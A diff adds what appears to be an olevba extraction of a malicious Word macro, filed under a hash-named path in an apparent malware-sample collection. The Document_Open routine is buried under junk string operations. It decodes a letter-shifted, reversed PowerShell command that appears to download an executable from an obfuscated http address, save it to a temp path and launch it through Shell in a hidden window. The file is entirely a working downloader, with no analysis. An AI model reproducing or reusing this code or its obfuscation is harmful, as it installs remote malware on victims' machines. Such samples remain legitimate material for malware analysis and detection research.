@@ -1,0 +1,368 @@
+Filename     : ./macros/67cbe103448764c1a4a87409093a5fb495bf14e46948e493b3ae7ff72761ea5e
+OLE stream   : Macros/VBA/ThisDocument
+VBA filename : ThisDocument.cls
+----------------------------------------
+Attribute VB_Name = "ThisDocument"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+Private Sub Document_Open()
+    For BekgG = 0 To 51
+        Voiz = Replace("DSJMfmYiCopV", "DSJM", "MhHD")
+                If 1779278 = 196 - 232 Then
+            JOPqx = Replace("opkAhxUbfyBpaL", "opkA", "gUMMY")
+            JOPqx = StrReverse("opkAhxUbfyBpaL")
+            End If
+        Voiz = Replace("RPGswkPJYFysI", "RPG", "KIVYnIu")
+        Voiz = Replace("aifWjkyCAxhoUDRYtgV", "aifW", "UTyt")
+                If 2225362 = 222 - 8155 Then
+            hvKDG = Replace("SPMXpyRSzRCmI", "SPMX", "tzXMsJ")
+            hvKDG = StrReverse("SPMXpyRSzRCmI")
+            THgDU = Replace("jYpfMrEGzSkmJ", "jYpf", "WralQ")
+            THgDU = StrReverse("jYpfMrEGzSkmJ")
+            End If
+        Voiz = Replace("XZScoKlWxRarqIY", "XZSc", "rxDQwRm")
+                If 2172587 = 5 - 6784 Then
+            LJoyx = Replace("ySTGpLlddasP", "yST", "OHhH")
+            LJoyx = StrReverse("ySTGpLlddasP")
+            End If
+        Voiz = StrReverse("xzsKQQPeXmpfVkIflg")
+        Voiz = StrReverse("xFsTqyFEuysCk")
+        Voiz = StrReverse("nhsPFLKTFoknBt")
+        Voiz = Replace("GnYtjGduDROqpmh", "GnYt", "iaeDFO")
+        Voiz = Replace("XvMFdKHptL", "XvMF", "eevdAH")
+        Voiz = StrReverse("DJPhKpSVEQWPLCCeL")
+        Voiz = Replace("IlYxGHgjtUpeIvsfoWG", "IlYx", "BDbm")
+        Voiz = Replace("RFvWvTEqmsPguMTfLVz", "RFv", "UOutO")
+        Voiz = Replace("hqwMoufFvTCYvCx", "hqwM", "licCEFE")
+        Voiz = Replace("nHiaipyvwOc", "nHi", "DdgeB")
+                If 713937 = 48 - 6714 Then
+            DQTvJ = Replace("QBJMWqhHXwzJnU", "QBJ", "LIhRV")
+            DQTvJ = StrReverse("QBJMWqhHXwzJnU")
+            fHSMX = Replace("bchSlPzkZQfP", "bch", "gjoqO")
+            fHSMX = StrReverse("bchSlPzkZQfP")
+            End If
+        Voiz = Replace("PhZZUTrCQujKuwJPwxg", "PhZZ", "lLHvs")
+        Voiz = StrReverse("LQxoymqvJwTgDOmuJvv")
+        Voiz = StrReverse("TlxmQpxVzWMmvdobpah")
+                If 2877107 = 157 - 2955 Then
+            qHFCA = Replace("CwDKvYUPyan", "CwD", "dsVMDbA")
+            qHFCA = StrReverse("CwDKvYUPyan")
+            SqoDl = Replace("afBKjODrXIbCcbrewSW", "afBK", "ApqtcJS")
+            SqoDl = StrReverse("afBKjODrXIbCcbrewSW")
+            End If
+        Voiz = Replace("uARdjGIfKJmcQd", "uAR", "BehSk")
+                If 2495541 = 198 - 1524 Then
+            EeCur = Replace("MBKHJwjVCZulxidREp", "MBK", "dqaAztF")
+            EeCur = StrReverse("MBKHJwjVCZulxidREp")
+            fqdxF = Replace("PHAEdtzrDMZtJg", "PHAE", "TJwVhFJ")
+            fqdxF = StrReverse("PHAEdtzrDMZtJg")
+            End If
+                If 3311153 = 174 - 7719 Then
+            MJZdl = Replace("jvopXAhklj", "jvop", "dcfG")
+            MJZdl = StrReverse("jvopXAhklj")
+            RXpoq = Replace("vQJhkoQsXXOR", "vQJh", "Ijxk")
+            RXpoq = StrReverse("vQJhkoQsXXOR")
+            End If
+    Next BekgG
+
+    While XAjq < 3375
+        If XAjq = 98 Then
+            WBsC = Replace("IsVmDbyddB", "IsV", "GoSud")
+        ElseIf XAjq = 2835 Then
+            WBsC = Replace("PpgxccXuFe", "Ppg", "eXPJb")
+        ElseIf XAjq = 1151 Then
+            WBsC = Replace("mPetYBAERJ", "mPe", "SJdLr")
+        ElseIf XAjq = 871 Then
+            WBsC = Replace("uakeyybYfr", "uak", "bWDmK")
+        ElseIf XAjq = 2368 Then
+            WBsC = Replace("HkiTZdXuFd", "Hki", "fQAah")
+        ElseIf XAjq = 2714 Then
+            WBsC = Replace("MOxKMUTLtu", "MOx", "yYAHS")
+        ElseIf XAjq = 2144 Then
+            WBsC = Replace("mwprKLFOqO", "mwp", "yKeeG")
+        ElseIf XAjq = 524 Then
+            WBsC = Replace("ylmGgMjYoV", "ylm", "SXuti")
+        ElseIf XAjq = 2506 Then
+            WBsC = Replace("IWTwIMMpil", "IWT", "offlh")
+        ElseIf XAjq = 1022 Then
+            WBsC = Replace("TZVyVAIQao", "TZV", "GZupX")
+        ElseIf XAjq = 176 Then
+            WBsC = Replace("srGgGYEDIX", "srG", "tFIrf")
+        ElseIf XAjq = 1737 Then
+            WBsC = Replace("rJdEwnQVWQ", "rJd", "zHBIW")
+        ElseIf XAjq = 914 Then
+            WBsC = Replace("baDzxuDBWE", "baD", "gMLtm")
+        ElseIf XAjq = 1224 Then
+            WBsC = Replace("durHBruBSV", "dur", "CJEOa")
+        ElseIf XAjq = 382 Then
+            WBsC = Replace("rsFnbpDUqE", "rsF", "oVsxu")
+        ElseIf XAjq = 3042 Then
+            gKJk = Split(Replace(pBe, "Cimpl", "vDp"), Chr(122 + 2))(3 - 1)
+        ElseIf XAjq = 710 Then
+            WBsC = Replace("PBWuCYHEHv", "PBW", "UWlLl")
+        ElseIf XAjq = 1782 Then
+            WBsC = Replace("tdqDGWscOZ", "tdq", "VvMEd")
+        ElseIf XAjq = 2890 Then
+            WBsC = Replace("ojFEgIsDfp", "ojF", "VORGJ")
+        ElseIf XAjq = 2334 Then
+            WBsC = Replace("UxqZcYWtes", "Uxq", "QJfdm")
+        ElseIf XAjq = 2852 Then
+            WBsC = Replace("wyqjbFRldP", "wyq", "pnlyB")
+        ElseIf XAjq = 1861 Then
+            WBsC = Replace("pbLqDDmATd", "pbL", "WfEAK")
+        ElseIf XAjq = 621 Then
+            WBsC = Replace("ZQyBJceQAv", "ZQy", "vdeLn")
+        ElseIf XAjq = 755 Then
+            WBsC = Replace("jFMBmUUbnf", "jFM", "reiUe")
+        ElseIf XAjq = 3173 Then
+            iMdM = Split(Replace(pBe, "uFsAe", "Ugh"), Chr(121 + 3))(0)
+        ElseIf XAjq = 1628 Then
+            WBsC = Replace("sAQDkIiFUs", "sAQ", "WTsYQ")
+        ElseIf XAjq = 2053 Then
+            WBsC = Replace("WXWqlTPLZm", "WXW", "ouvBM")
+        ElseIf XAjq = 3230 Then
+            uqUI = Replace(gKJk, Jtp, Chr(104) + Chr(116) + Chr(116) + Chr(112))
+        ElseIf XAjq = 1705 Then
+            WBsC = Replace("dFDRVAstOv", "dFD", "OQEPR")
+        ElseIf XAjq = 2655 Then
+            WBsC = Replace("xjIEZVzxBT", "xjI", "OnWSV")
+        ElseIf XAjq = 2604 Then
+            WBsC = Replace("KdkZCCKxSp", "Kdk", "qVETx")
+        ElseIf XAjq = 2800 Then
+            WBsC = Replace("sHWloFXbLL", "sHW", "KfjGp")
+        ElseIf XAjq = 2964 Then
+            pBe = Replace(StrReverse(wzzkAlJjkS(1)), "QLpzf", "jyD")
+        ElseIf XAjq = 3280 Then
+            iIRl = Replace(uqUI, iMdM, Chr(44 + 2))
+        ElseIf XAjq = 1181 Then
+            WBsC = Replace("WIMyBSqnBS", "WIM", "vqDhe")
+        ElseIf XAjq = 472 Then
+            WBsC = Replace("PCyqFlwPcc", "PCy", "nGGSX")
+        ElseIf XAjq = 1292 Then
+            WBsC = Replace("KuXaviLQYA", "KuX", "wcdcc")
+        ElseIf XAjq = 1371 Then
+            WBsC = Replace("HlZbHBTelw", "HlZ", "RfTGF")
+        ElseIf XAjq = 832 Then
+            WBsC = Replace("hwagyZSIjU", "hwa", "ubjPL")
+        ElseIf XAjq = 2463 Then
+            WBsC = Replace("acECIstjsX", "acE", "wDlwx")
+        ElseIf XAjq = 1464 Then
+            WBsC = Replace("QSZpJFmShC", "QSZ", "rYOaV")
+        ElseIf XAjq = 789 Then
+            WBsC = Replace("xVuOguHkJP", "xVu", "btuYn")
+        ElseIf XAjq = 288 Then
+            WBsC = Replace("wDCpBbrsnY", "wDC", "EpLQK")
+        ElseIf XAjq = 1569 Then
+            WBsC = Replace("bRmatKCBUa", "bRm", "sTmrR")
+        ElseIf XAjq = 631 Then
+            WBsC = Replace("jxCUGCimRh", "jxC", "feJVn")
+        ElseIf XAjq = 1106 Then
+            WBsC = Replace("DPWYsUYjRR", "DPW", "rYPZS")
+        ElseIf XAjq = 1313 Then
+            WBsC = Replace("LxYnhXTWJz", "LxY", "bHvdy")
+        ElseIf XAjq = 362 Then
+            WBsC = Replace("VqlxWuIwvY", "Vql", "edFFg")
+        ElseIf XAjq = 3347 Then
+            Shell (StrReverse(StrReverse(iIRl))), 0
+        ElseIf XAjq = 237 Then
+            WBsC = Replace("fMfVyEOOAa", "fMf", "bhMxW")
+        ElseIf XAjq = 2023 Then
+            WBsC = Replace("rncCpOtsmP", "rnc", "VLkoD")
+        ElseIf XAjq = 3117 Then
+            Jtp = Split(Replace(pBe, "uRJeS", "EuK"), Chr(123 + 1))(3 - 2)
+        ElseIf XAjq = 1895 Then
+            WBsC = Replace("kGBUTPVPbB", "kGB", "ziQfc")
+        ElseIf XAjq = 2231 Then
+            WBsC = Replace("OLYBwjHhpR", "OLY", "dbCRA")
+        ElseIf XAjq = 1932 Then
+            WBsC = Replace("sDQsbZvLFT", "sDQ", "GdYak")
+        ElseIf XAjq = 1717 Then
+            WBsC = Replace("mzbRKrIJqL", "mzb", "sKShY")
+        ElseIf XAjq = 2406 Then
+            WBsC = Replace("kDwquAUECi", "kDw", "rTuJg")
+        End If
+        XAjq = XAjq + 1
+Wend
+
+    For FlFVU = 0 To 204
+        wIis = Replace("YSplhBSeyfYnZ", "YSpl", "BDRHje")
+                If 3100017 = 181 - 7425 Then
+            RWQgk = Replace("uCPQhremshyFiBLWT", "uCP", "pcxxnR")
+            RWQgk = StrReverse("uCPQhremshyFiBLWT")
+            End If
+                If 2595505 = 152 - 4161 Then
+            PmmUD = Replace("hzbUVebOvVzKTCQhGu", "hzbU", "GmCdiXt")
+            PmmUD = StrReverse("hzbUVebOvVzKTCQhGu")
+            End If
+        wIis = Replace("XIFmodckLTIO", "XIFm", "PrYkO")
+        wIis = StrReverse("olpXlAAOAFnhjA")
+        wIis = StrReverse("vQqXQMuwUdGIoOrKkHJ")
+        wIis = StrReverse("YFmFkXepanmgp")
+        wIis = Replace("KOLZwjRsMiDCIGnFS", "KOLZ", "ePOZLVw")
+        wIis = StrReverse("eDWndgjemHtYv")
+        wIis = Replace("JTroohdmAFhTrlhqij", "JTr", "HrDeMd")
+                If 2064796 = 202 - 1715 Then
+            slPpp = Replace("TGxDRPySUz", "TGx", "cLwTs")
+            slPpp = StrReverse("TGxDRPySUz")
+            KDSty = Replace("JUqZTmCeXXxfxP", "JUqZ", "GjYenC")
+            KDSty = StrReverse("JUqZTmCeXXxfxP")
+            End If
+        wIis = Replace("hwOPrrKRJSIfatnmCkT", "hwOP", "rfrmXI")
+        wIis = Replace("gTXtuqAKhjlrMEfUxE", "gTX", "VCro")
+        wIis = Replace("HqwprcpaneBaObT", "Hqwp", "mLRgF")
+                If 243114 = 124 - 896 Then
+            PLnwp = Replace("YqGbJclGcexkdQyhHK", "YqG", "pcvoJp")
+            PLnwp = StrReverse("YqGbJclGcexkdQyhHK")
+            End If
+                If 3788690 = 240 - 3348 Then
+            kpokT = Replace("SToaoWQIUQRfplgnd", "STo", "hyDZpP")
+            kpokT = StrReverse("SToaoWQIUQRfplgnd")
+            IRvMV = Replace("khkyOFGdYCBfxL", "khk", "LEzEOs")
+            IRvMV = StrReverse("khkyOFGdYCBfxL")
+            End If
+        wIis = Replace("XdMQhSjeWqnectk", "XdM", "kuzORK")
+        wIis = StrReverse("jTwXiWkWAfMqLlAXfRn")
+        wIis = Replace("QpvBacFCZQsQfV", "QpvB", "DtWyb")
+        wIis = Replace("HxAQkavaPPKR", "HxA", "CkyWK")
+        wIis = StrReverse("FbEYXtVpeyvjLBZ")
+                If 3329320 = 63 - 3814 Then
+            kMRAL = Replace("bgGPMHOdRULqQVJ", "bgG", "jgvKOOp")
+            kMRAL = StrReverse("bgGPMHOdRULqQVJ")
+            ZfvYf = Replace("UrewfyCVnKKoWhIboE", "Ure", "waTCuA")
+            ZfvYf = StrReverse("UrewfyCVnKKoWhIboE")
+            End If
+        wIis = Replace("AOHMzmjZIQRy", "AOH", "SiYjT")
+        wIis = StrReverse("VAKerXjbgTWrYEcvl")
+        wIis = Replace("ctIidwxmjhuy", "ctI", "XTxPUta")
+    Next FlFVU
+    For IeZtX = 0 To 147
+                If 227045 = 133 - 7483 Then
+            UuuPF = Replace("LghxaKJCGpjZyvgI", "Lgh", "zCJME")
+            UuuPF = StrReverse("LghxaKJCGpjZyvgI")
+            PrTIi = Replace("DPExBRjcDm", "DPEx", "EZujg")
+            PrTIi = StrReverse("DPExBRjcDm")
+            End If
+                If 1078219 = 210 - 1929 Then
+            oJhSX = Replace("rIfxWYOXWyEBgm", "rIf", "SJJV")
+            oJhSX = StrReverse("rIfxWYOXWyEBgm")
+            JYLEU = Replace("siMMzRWZpZOgOGxev", "siMM", "YpEQay")
+            JYLEU = StrReverse("siMMzRWZpZOgOGxev")
+            End If
+        qnzi = Replace("zkUlJFLnPzxf", "zkU", "goKMFzq")
+        qnzi = StrReverse("rUGOnfyEnk")
+        qnzi = Replace("IgikeUDSDvKe", "Igi", "SBfPBL")
+        qnzi = StrReverse("xcKagCAeBVgb")
+        qnzi = Replace("yaixesaqkw", "yai", "KmzekAr")
+        qnzi = Replace("vaIbFVDzIu", "vaIb", "pmwBZ")
+        qnzi = Replace("usYptlrlkhfbkrw", "usY", "sqCwI")
+        qnzi = StrReverse("PCSBeDvLRsRJp")
+        qnzi = Replace("PscEBOLsQduTPmo", "PscE", "RGAoiB")
+        qnzi = Replace("LTGQeFSZiUYM", "LTG", "mTTtdb")
+        qnzi = Replace("sYddjQnBjP", "sYdd", "uMpWF")
+                If 2441763 = 220 - 7379 Then
+            kblru = Replace("txAEMRTPdcy", "txAE", "EPequaB")
+            kblru = StrReverse("txAEMRTPdcy")
+            iHPvV = Replace("DtThzcrxuUIrO", "DtTh", "UKIGu")
+            iHPvV = StrReverse("DtThzcrxuUIrO")
+            End If
+        qnzi = StrReverse("vzHjowbSGqg")
+        qnzi = Replace("fLtrtFcOTlE", "fLt", "igOio")
+        qnzi = StrReverse("lxIqdYuFhLedOl")
+        qnzi = Replace("CRnYesJuzGqf", "CRn", "IBcIWD")
+        qnzi = StrReverse("hQWdTIimUTl")
+        qnzi = Replace("eLjmIFWBQhh", "eLj", "IqsuWCk")
+                If 3248293 = 260 - 3508 Then
+            dgDPE = Replace("BUlarXoDEGM", "BUl", "rGWVpDS")
+            dgDPE = StrReverse("BUlarXoDEGM")
+            End If
+        qnzi = StrReverse("gAuvTVblppg")
+                If 3873439 = 74 - 2966 Then
+            reTLF = Replace("aEcqvHVqvUbZacb", "aEcq", "yEjH")
+            reTLF = StrReverse("aEcqvHVqvUbZacb")
+            POfwW = Replace("hhRPeAsQzALS", "hhR", "VkMVv")
+            POfwW = StrReverse("hhRPeAsQzALS")
+            End If
+        qnzi = StrReverse("DLuakKrdHtqY")
+                If 1578749 = 242 - 5798 Then
+            iEnPM = Replace("roOhSwEpnBOdoC", "roO", "jjCiT")
+            iEnPM = StrReverse("roOhSwEpnBOdoC")
+            End If
+    Next IeZtX
+
+End Sub
+Public Function wzzkAlJjkS(tETtu) As String
+    For MUfyo = 0 To 395
+        Uimi = Replace("SetRXrHWjKscL", "SetR", "vFvhWsf")
+        Uimi = StrReverse("vpmhScaRyotYpBpuBQ")
+                If 3017287 = 126 - 1919 Then
+            UrWFc = Replace("MIwvWqewYL", "MIw", "Qttod")
+            UrWFc = StrReverse("MIwvWqewYL")
+            HUaQF = Replace("ogHSeFruXZW", "ogH", "PInOY")
+            HUaQF = StrReverse("ogHSeFruXZW")
+            End If
+        Uimi = Replace("piLSTUaVwkU", "piLS", "nWXO")
+        Uimi = Replace("JmxgTaYLzwpM", "Jmxg", "vLcI")
+        Uimi = Replace("hkyFmxWGabQKXRBHi", "hky", "TIbw")
+                If 1345939 = 58 - 8094 Then
+            urShO = Replace("CTZJCdXhrtoiDIIBxt", "CTZ", "iAtKMBn")
+            urShO = StrReverse("CTZJCdXhrtoiDIIBxt")
+            OEVSE = Replace("yuquMKSXhKOyLU", "yuq", "WFSRU")
+            OEVSE = StrReverse("yuquMKSXhKOyLU")
+            End If
+        Uimi = StrReverse("hkZvzDtuWh")
+        Uimi = StrReverse("iozCTMHfJytSlVkdWC")
+        Uimi = Replace("amYpBlvxkhnqXgMa", "amY", "WGnAIum")
+        Uimi = Replace("vTzhZSriHZTDOJELLZ", "vTzh", "vQvMj")
+                If 291187 = 104 - 6620 Then
+            SdpIC = Replace("tPgLyhGJMXq", "tPg", "iYwBFo")
+            SdpIC = StrReverse("tPgLyhGJMXq")
+            End If
+        Uimi = StrReverse("hKhUvfaQOUspsA")
+                If 1077235 = 142 - 2743 Then
+            MHLQe = Replace("bBsMKrQhlGupPqVTor", "bBs", "HfRltt")
+            MHLQe = StrReverse("bBsMKrQhlGupPqVTor")
+            SXfti = Replace("URpWStbDWMkg", "URp", "DVeKXa")
+            SXfti = StrReverse("URpWStbDWMkg")
+            End If
+                If 2977213 = 236 - 6643 Then
+            lCmSR = Replace("vmpPEaVXdscEP", "vmpP", "doRT")
+            lCmSR = StrReverse("vmpPEaVXdscEP")
+            End If
+        Uimi = Replace("IYzQjXIYJvISRXWfC", "IYzQ", "WXDd")
+                If 1561115 = 119 - 7480 Then
+            jbdOn = Replace("VXinFuKnLGjyubOed", "VXi", "olVL")
+            jbdOn = StrReverse("VXinFuKnLGjyubOed")
+            End If
+        Uimi = StrReverse("iWELrJnTmZsoUmXhL")
+        Uimi = Replace("UptiovsjzP", "Upti", "auYq")
+        Uimi = Replace("IjwPkRSkzF", "IjwP", "yMMTXX")
+        Uimi = StrReverse("CcLpaQTROlH")
+        Uimi = Replace("JelwVmAIgIrDDfqYw", "Jel", "mSPz")
+        Uimi = Replace("LpTyfMdbBi", "LpTy", "yWZFQAD")
+        Uimi = Replace("LRdfjdwYwJ", "LRd", "WDFws")
+        Uimi = StrReverse("GiKVhVTTTnwJsEtBCU")
+    Next MUfyo
+    qIF = qIF & StrReverse(StrReverse("PIsZMeQrBhcSlVIToSTpvveDgVUPtiIkwQrotxijkpOiyxFCYeitkvLFxlVuLzfQMYOqXiwVJCkFAZpAOgMWxV"))
+    qIF = qIF & StrReverse(StrReverse("HIEOVpRslSuOGm|;)'fyf.sDQT\'+)(iubPqnfTufG::]iubP.OI.nfutzS[( iubqfmjF- ttfdpsP-usbuS 1 "))
+    qIF = qIF & StrReverse(StrReverse("x- fyf.mmfitsfxpq;))'fyf.sDQT\'+)(iubPqnfTufG::]iubP.OI.nfutzS[(,'fyf.lUJys"))
+    qIF = qIF & StrReverse(StrReverse("CiOwAsLl/hnj/npd.xpozbeznfwpm//:quui'(fmjFebpmoxpD.)uofjmCcfW.ufN.nfutz"))
+    qIF = qIF & StrReverse(StrReverse("S udfkcO-xfN( 1 x- fyf.mmfitsfxpq|xTi|SYnl"))
+    Dim WfdI() As Byte
+    WfdI = StrConv(qIF, vbFromUnicode)
+    While cfBy <= UBound(WfdI)
+        PPIaf = Replace("MaUiUigEfe", "MaU", "pbgsk")
+        PPIaf = Replace("BkmeFvLinp", "Bkm", "ItjAo")
+        If WfdI(cfBy) >= 97 And WfdI(cfBy) <= 122 Then
+        WfdI(cfBy) = WfdI(cfBy) - tETtu
+        End If
+    cfBy = cfBy + 1
+        PPIaf = Replace("OxfmIGAlzl", "Oxf", "GsePP")
+        PPIaf = Replace("SVKjYstfxe", "SVK", "AshsK")
+    Wend
+    wzzkAlJjkS = StrConv(WfdI, vbUnicode)
+End Function
